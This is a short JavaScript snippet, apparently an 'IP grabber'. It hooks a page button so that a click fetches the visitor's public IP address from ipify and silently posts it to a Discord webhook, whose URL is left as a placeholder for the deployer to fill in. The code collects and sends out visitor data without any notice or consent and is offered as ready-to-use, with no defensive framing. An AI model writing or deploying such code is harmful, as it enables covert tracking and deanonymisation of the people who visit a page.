document.querySelector('button').addEventListener('click', async function() {
    try {
      const ipAddressResponse = await fetch('https://api64.ipify.org?format=json');
      if (ipAddressResponse.ok) {
        const ipAddressData = await ipAddressResponse.json();
        const ipAddress = ipAddressData.ip;
  
        const webhookUrl = 'your webhook'; // Insert your Discord webhook URL here
  
        const webhookResponse = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ content: `IP address: ${ipAddress}` })
        });
  
        if (!webhookResponse.ok) {
          console.error('Error sending IP address to Discord webhook:', webhookResponse.statusText);
        }
      } else {
        console.error('Error fetching IP address:', ipAddressResponse.statusText);
      }
    } catch (error) {
      console.error('An error occurred:', error);
    }
  });
  